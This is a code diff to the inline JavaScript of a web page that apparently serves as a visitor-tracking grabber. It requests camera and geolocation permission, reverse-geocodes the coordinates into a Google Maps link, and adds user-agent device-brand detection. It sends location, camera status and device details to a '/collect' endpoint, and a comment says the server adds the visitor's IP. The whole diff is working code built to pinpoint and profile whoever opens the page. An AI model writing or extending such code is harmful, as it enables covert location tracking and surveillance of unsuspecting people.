@@ -81,19 +81,31 @@
   </div>
 
   <script>
+function getDeviceName() {
+  const ua = navigator.userAgent.toLowerCase();
+  const brands = {
+    samsung: "Samsung", iphone: "iPhone", ipad: "iPad",
+    pixel: "Google Pixel", oneplus: "OnePlus", xiaomi: "Xiaomi",
+    redmi: "Redmi", realme: "Realme", oppo: "Oppo",
+    vivo: "Vivo", nokia: "Nokia", tecno: "Tecno",
+    infinix: "Infinix", motorola: "Motorola", huawei: "Huawei",
+    itel: "Itel", lenovo: "Lenovo", lg: "LG", asus: "Asus"
+  };
+  for (let key in brands) if (ua.includes(key)) return brands[key];
+  return "Unknown Device";
+}
+
 async function reverseGeocode(lat, lon) {
   try {
     const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
-    const res = await fetch(url, {
-      headers: { 'User-Agent': 'Mozilla/5.0' }
-    });
+    const res = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
     const data = await res.json();
     return {
       city: data.address.city || data.address.town || data.address.village || "Unknown",
       country: data.address.country || "Unknown",
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
     };
-  } catch (e) {
+  } catch {
     return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
   }
 }
@@ -106,7 +118,7 @@ async function sendFullData(locationCoords, cameraStatus) {
   }
 
   const payload = {
-    ip: "Unknown",  // IP from server side
+    ip: "Unknown", // Actual IP will be added by server-side (main.py)
     latitude: locationCoords?.latitude || null,
     longitude: locationCoords?.longitude || null,
     mapsLink: locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied",
@@ -115,7 +127,7 @@ async function sendFullData(locationCoords, cameraStatus) {
     country: locationData.country,
     camera: cameraStatus,
     userAgent: navigator.userAgent,
-    deviceInfo: navigator.platform
+    deviceInfo: getDeviceName()
   };
 
   await fetch("/collect", {
@@ -145,14 +157,10 @@ async function askForPermissions() {
     }, 3000);
 
     navigator.geolocation.getCurrentPosition(
-      pos => {
-        sendFullData(pos.coords, "✅ Camera Allowed");
-      },
-      err => {
-        sendFullData(null, "✅ Camera Allowed, ❌ Location Denied");
-      }
+      pos => sendFullData(pos.coords, "✅ Camera Allowed"),
+      err => sendFullData(null, "✅ Camera Allowed, ❌ Location Denied")
     );
-  } catch (err) {
+  } catch {
     sendFullData(null, "❌ Camera Denied");
   }
 }
